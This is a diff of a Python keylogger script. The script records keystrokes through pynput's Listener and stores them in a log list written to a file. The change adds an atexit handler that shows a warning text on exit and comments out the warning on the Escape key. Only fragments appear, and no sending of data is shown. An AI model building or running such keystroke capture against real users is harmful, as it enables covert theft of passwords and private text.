@@ -3,11 +3,11 @@ import requests
 import socket
 import time
 import shutil
+import atexit
 from pynput.keyboard import Key, Listener
 
 
 class KeyLogVar:
-    counter = 0
     key_logs = []
 
 
@@ -46,8 +46,13 @@ def file_wr(key_logs):
 # Exist solely as a temporary quit. Will be removed in final version.
 def key_release(key):
     if key == Key.esc:
-        warning_text()
+        # warning_text()
         return False
+
+
+# handles the warning text upon exit of the program
+def exit_handler():
+    warning_text()
 
 
 def warning_text():
@@ -71,3 +76,4 @@ def warning_text():
 # Sets up the Listener instance and joins the listener in the main thread
 with Listener(on_press=key_input, on_release=key_release) as listener:
     listener.join()
+    atexit.register(exit_handler)
